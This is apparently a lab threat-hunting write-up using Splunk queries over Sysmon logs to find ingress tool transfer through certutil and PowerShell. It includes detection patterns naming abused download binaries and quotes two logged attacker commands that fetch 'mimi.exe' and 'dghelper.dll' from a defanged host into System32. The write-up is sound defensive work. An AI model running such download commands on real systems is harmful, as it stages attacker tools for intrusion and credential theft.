# Hunting C2: Ingress Tool Transfer (LOLBAS)

## Overview

This report documents hunting for command-and-control artifacts under the Command and Control tactic on the MITRE ATT&CK framework. The related technique is Ingress Tool Transfer (T1105). I used Splunk to search for Living Off the Land Binaries (LOLBAS) — legitimate, natively present Windows tools that attackers commonly abuse to download payloads without introducing new, easily flagged software.

## Investigation

### Step 1: Search for LOLBAS tools making HTTP requests

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 (Image="*\certutil.exe" OR "*\bitsadmin.exe" OR "*\curl.exe" OR "*\wget.exe"
OR "*\finger.exe" OR "*\mshta.exe" OR "*\winget.exe") AND CommandLine="*http*"
| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
| sort -_time
```

I ran this to check whether any of the common LOLBAS tools used for downloading files had been invoked with an HTTP reference in their command line.

| Time | User | Image | CommandLine | ParentImage |
|---|---|---|---|---|
| 22:31:19 | SYSTEM | C:\Windows\SysWOW64\certutil.exe | `certutil -urlcache -split -f hxxp://10[.]0[.]2[.]6/mimi.exe C:\Windows\System32\mimi.exe` | C:\Windows\SysWOW64\cmd.exe |

This single result confirmed `certutil.exe` — a legitimate Windows certificate utility — being abused to download `mimi.exe` from an external host.

### Step 2: Broaden the search to include PowerShell-based tool transfer

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 (Image="*\certutil.exe" AND CommandLine="*urlcache*") OR
(Image="*\powershell.exe" AND (CommandLine="*Invoke-Webrequest*" OR
CommandLine="*iwr*" OR CommandLine="*Net.WebClient*"))
| table _time, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine
| sort -_time
```

I narrowed the LOLBAS search and added PowerShell download cmdlets to the same query, since PowerShell is also frequently used for ingress tool transfer even though it isn't a classic LOLBAS binary.

| Time | User | Image | CommandLine | ParentImage |
|---|---|---|---|---|
| 22:31:19 | SYSTEM | C:\Windows\SysWOW64\certutil.exe | `certutil -urlcache -split -f hxxp://10[.]0[.]2[.]6/mimi.exe C:\Windows\System32\mimi.exe` | C:\Windows\SysWOW64\cmd.exe |
| 22:29:46 | SYSTEM | C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe | `powershell -c "Invoke-WebRequest -Uri hxxp://10[.]0[.]2[.]6/dghelper.dll -OutFile 'C:\Windows\System32\dghelper.dll'"` | C:\Windows\SysWOW64\cmd.exe |

## Key Findings

- Two separate ingress tool transfer techniques were used within the same attack session: `certutil -urlcache` to download `mimi.exe`, and PowerShell's `Invoke-WebRequest` to download `dghelper.dll`.
- Both downloads pulled from the same external host, `10[.]0[.]2[.]6`, confirming a single attacker-controlled staging server.
- Both commands shared the same parent process, `cmd.exe`, tying this tool transfer activity directly to the same session already identified in the execution and persistence hunts.

## Key Takeaways

- LOLBAS tools like `certutil` are legitimate, signed Windows binaries, which is exactly why they're attractive to attackers — they blend in and are less likely to be flagged by simple allowlist-based defenses.
- Searching for known LOLBAS binaries combined with an HTTP indicator in the command line is a fast, high-signal way to catch ingress tool transfer, without needing to know the destination or payload in advance.
- Extending the same search to include PowerShell's own download cmdlets closes a gap that a LOLBAS-only search would miss, since attackers frequently mix both approaches.

## Conclusion

I identified two separate LOLBAS-based ingress tool transfer methods (T1105) — `certutil` and PowerShell — both downloading payloads from the same external host, confirming a coordinated tool staging step in the attack chain.
